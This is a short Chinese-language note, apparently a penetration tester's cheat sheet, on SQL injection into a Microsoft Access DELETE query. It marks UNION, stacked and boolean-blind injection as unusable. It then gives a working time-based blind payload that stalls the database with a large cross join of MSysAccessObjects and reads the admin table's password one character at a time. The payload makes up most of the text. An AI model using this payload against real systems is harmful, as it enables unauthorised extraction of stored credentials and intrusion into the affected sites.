1、报错注入  
2、UNION注入-不可用
```
delete from下where子句中不能使用union
```
3、堆叠注入-不可用  
4、布尔盲注-不可用
```
界面无正确或错误显示
```
5、时间盲注-可用：  
```
delete from admin where id=7 and (SELECT count(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, 
MSysAccessObjects AS T7,MSysAccessObjects AS T8,MSysAccessObjects AS T9,MSysAccessObjects AS T10,MSysAccessObjects AS T11,MSysAccessObjects AS T12)>0 and asc(mid((select top 1 password from admin),1,1))=117
```
此payload的执行需要where子句中的条件都为true，延时大概49s  
其中，如下语句造成延时：
```
(SELECT count(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, 
MSysAccessObjects AS T7,MSysAccessObjects AS T8,MSysAccessObjects AS T9,MSysAccessObjects AS T10,MSysAccessObjects AS T11,MSysAccessObjects AS T12)>0
```
如下语句测试数据：
```
asc(mid((select top 1 password from admin),1,1))=117
```
参考链接：  
https://www.freebuf.com/news/39925.html
